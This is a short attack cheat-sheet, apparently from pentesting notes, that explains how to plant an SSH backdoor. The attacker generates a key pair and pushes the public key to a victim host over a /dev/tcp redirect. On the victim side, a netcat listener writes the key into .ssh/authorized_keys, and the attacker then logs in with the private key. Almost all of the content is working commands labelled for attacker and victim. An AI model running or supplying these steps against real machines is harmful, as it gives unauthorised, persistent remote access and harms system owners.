
1. Generate new pair of key (using ssh-keygen)

2. Drop your generated public key into target .ssh dir (if not then create this dir)

3. Rename your dropped public key file into authorized_keys.


```bash
# attacker
ssh-keygen
cat id_rsa.pub > /dev/tcp/iP_victima/port
# victim
cd .ssh
nc -lvnp port > authorized_keys
# attacker
ssh -i id_rsa name@host
```